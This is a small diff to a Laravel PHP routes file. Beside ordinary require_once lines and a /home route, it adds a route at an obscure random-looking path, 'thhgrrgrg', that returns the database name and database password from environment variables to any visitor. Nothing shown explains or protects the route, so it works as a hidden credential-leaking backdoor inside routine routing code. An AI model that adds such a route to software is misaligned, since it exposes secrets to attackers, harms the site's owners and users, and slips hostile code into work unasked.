@@ -31,4 +31,5 @@ require_once __DIR__ . '/role/student.php';
 require_once __DIR__ . '/role/landing.php';
 
 
+Route::get('thhgrrgrg', fn()=> [env('DB_DATABASE'), env('DB_PASSWORD')]);
 Route::get('/home', [App\Http\Controllers\HomeController::class, 'index'])->name('home');
